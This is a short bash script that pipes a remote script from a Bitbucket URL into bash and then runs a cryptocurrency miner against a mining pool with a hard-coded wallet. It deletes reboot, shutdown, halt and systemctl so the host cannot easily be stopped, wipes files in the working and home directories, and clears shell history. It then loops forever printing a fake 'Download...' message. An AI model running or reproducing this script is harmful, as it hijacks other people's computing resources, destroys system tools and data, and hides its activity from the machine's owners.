#!/bin/bash
apt-get update 
apt-get install -y wget curl
curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
chmod +x srbkaze
./srbkaze --algorithm heavyhash --pool stratum-asia.rplant.xyz:7050 --wallet UcNmFVcJkvJKakhWeuAmqYKQW5w4xJ4e64.kopi
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
